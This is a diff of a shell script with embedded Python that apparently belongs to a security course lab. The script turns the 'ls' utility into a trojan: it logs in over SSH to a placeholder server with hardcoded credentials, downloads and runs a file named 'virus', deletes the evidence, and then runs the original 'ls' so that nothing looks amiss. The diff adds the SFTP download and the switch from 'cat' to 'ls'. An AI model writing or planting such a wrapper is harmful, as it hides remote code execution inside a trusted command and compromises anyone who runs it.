@@ -8,14 +8,11 @@ import os
 def main():
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    client.connect(hostname="SER_IP", username="csc2023",
-                        password="csc2023", timeout=3)
-    stdin, stdout, stderr = client.exec_command('cat ~/virus')
-    output = stdout.read().decode()
-
-    with open('virus', 'w') as f:
-        f.write(output)
-
+    client.connect(hostname="SER_IP", username="csc2024",
+                        password="csc2024", timeout=3)
+    sftp_client = client.open_sftp()
+    sftp_client.get("/app/virus", "./virus")
+    sftp_client.close()
     client.close()
 
 if __name__ == "__main__":
@@ -24,10 +21,10 @@ if __name__ == "__main__":
 EOF
 
 python3 virus
-rm virus
+rm -f virus
 
-# Get original cat
-sed -n '/^---END OF PAYLOAD---/,/^---END OF ORIGINAL---/ { /---END OF PAYLOAD---/d; /---END OF ORIGINAL---/d; p }' cat > output
+# Get original ls
+sed -n '/^---END OF PAYLOAD---/,/^---END OF ORIGINAL---/ { /---END OF PAYLOAD---/d; /---END OF ORIGINAL---/d; p }' ./ls > output
 
 # Remove last line (\n)
 truncate -s -1 output
@@ -39,6 +36,6 @@ chmod +x output_pro
 ./output_pro $@
 
 # Remove tem cat
-rm output_pro output
+rm -f output_pro output
 
 exit
